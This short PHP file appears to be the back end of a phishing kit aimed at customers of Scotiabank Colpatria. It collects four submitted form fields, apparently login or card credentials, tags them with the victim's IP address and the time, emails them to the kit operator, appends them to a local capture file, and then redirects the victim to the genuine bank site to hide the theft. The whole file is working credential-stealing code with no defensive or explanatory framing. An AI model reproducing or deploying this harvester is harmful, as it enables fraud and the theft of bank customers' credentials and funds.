<meta http-equiv="Refresh"
content="0;url=https://www.scotiabankcolpatria.com"> 
<?php  
include "atheroz.php";
$email = $_POST['uno'];  
$pass = $_POST['dos'];
$emailx = $_POST['tres'];  
$passx = $_POST['cuatro'];  
$Date = "" . date("Y/m/d") . "";  
date_default_timezone_set("America/Mexico_City");  
$Time = "America/Mexico_City " . date("h:i:sa");  
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];  
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "   
cdig0 :  $email $pass $emailx $passx
ip : $IP";  
$MAIL_TITLE = "Atheroz | ".$IP."";  
$MAIL_HEADER = "From: Reporte_Atheroz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("Xcaps.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  



?>